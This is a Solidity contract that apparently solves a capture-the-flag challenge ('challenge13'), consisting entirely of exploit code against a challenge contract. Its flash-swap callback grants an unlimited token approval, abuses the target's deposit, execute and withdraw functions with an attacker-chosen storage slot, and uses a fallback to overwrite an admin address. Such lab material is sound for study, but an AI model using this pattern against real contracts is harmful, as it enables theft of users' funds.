pragma solidity ^0.8.0;

import "../challenge13/Storage2Main.sol";
import "hardhat/console.sol";

contract Storage2MainSolution {
    IERC20 public token;
    address public aaaaa;
    uint256 public constant VERSION = 1;

    address public admin;

    Storage2Main storage2main;
    MdexPair public pair;
    Storage2 public storage2;
    MyToken public tokena;
    bytes32 condition;

    constructor(address storagemain) {
        storage2main = Storage2Main(storagemain);
        pair = storage2main.pair();
        storage2 = storage2main.storage2();
        tokena = storage2main.tokena();
    }

    function expliot(bytes32 slot) public {
        condition = slot;
    }

    function hswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        tokena.approve(
            address(storage2),
            0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        );
        address b = address(this);
        uint256 a = uint256(uint160(b));

        storage2.depositGas(address(this), a);

        storage2.excute(condition);

        storage2.withdrawGas(storage2.gasDeposits(address(this)));

        tokena.transfer(
            address(pair),
            999999999999999999999999999999999999999999999999

        );

    }

//    function evaluate(
//        uint256 a,
//        bytes memory b,
//        bytes memory c,
//        address d
//    ) public {
//
//        admin = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
//
//    }
    fallback() external {
        admin = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
    }
}
